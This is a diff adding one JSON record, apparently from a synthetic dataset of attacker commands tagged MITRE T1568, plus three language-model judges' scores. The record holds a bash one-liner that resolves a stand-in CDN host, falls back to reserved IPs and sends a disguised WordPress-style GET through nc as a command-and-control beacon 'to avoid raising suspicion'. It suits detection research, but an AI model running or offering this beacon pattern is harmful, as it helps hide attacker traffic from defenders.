@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "bash -c \"host=cdn-assets.example.com; ip=$(dig +short \\\"$host\\\" | shuf -n1); if [ -z \\\"$ip\\\" ]; then for f in 203.0.113.10 198.51.100.10 192.0.2.10; do ip=\\\"$f\\\"; break; done; fi; ua=\\\"Mozilla/5.0\\\"; chk=$(date -u +%s); printf 'GET /wp-content/themes/twentytwenty/style.css?check=%s HTTP/1.1\\r\\nHost: %s\\r\\nUser-Agent: %s\\r\\nAccept: text/css,*/*;q=0.1\\r\\nConnection: close\\r\\n\\r\\n' \\\"$chk\\\" \\\"$host\\\" \\\"$ua\\\" | nc -w 5 \\\"$ip\\\" 80\"",
+  "explanation": "Resolves a CDN-like host and falls back to reserved IPs if resolution fails; emulates normal WordPress theme asset retrieval to avoid raising suspicion.",
+  "rationale_steps": [
+    "Resolve domain at runtime for dynamic endpoint selection.",
+    "Use fallback IP list when DNS resolution is unavailable.",
+    "Mimic benign HTTP GET to a common WordPress asset path.",
+    "Send via nc over standard TCP/80."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-213026ff-3ce72b16",
+  "source_prompt_hash": "213026ff",
+  "timestamp_utc": "2025-09-30T03:23:47.812011Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, valid flag formats, correct command separators, and appropriate escape sequences throughout the bash script.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements the Dynamic Resolution technique by resolving a domain, using fallback IPs if resolution fails, and establishing communication with a plausible HTTP request that mimics legitimate traffic patterns while maintaining command and control capability.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T04:58:34.861272Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, correctly using `bash -c` with proper escaping for variables, balanced quotes, and valid command syntax throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly demonstrates dynamic resolution via DNS lookup with a randomized IP selection and a robust fallback to hardcoded IPs, followed by a realistic C2 beaconing attempt masked as legitimate web traffic, fully aligning with T1568 and the provided explanation.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2025-10-02T04:58:44.762385Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The one-liner has balanced quoting, valid command substitutions and control structures, and uses appropriate flags for dig/shuf/nc, so it should parse and execute.",
+        "semantic_score": 4,
+        "semantic_justification": "It performs runtime DNS resolution, randomly selects an endpoint, falls back to alternate IPs, and issues a plausible HTTP GET\u2014demonstrating dynamic endpoint selection consistent with T1568\u2014though it lacks broader rotation/DGA and uses non-routable fallback IPs.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T04:59:21.829205Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
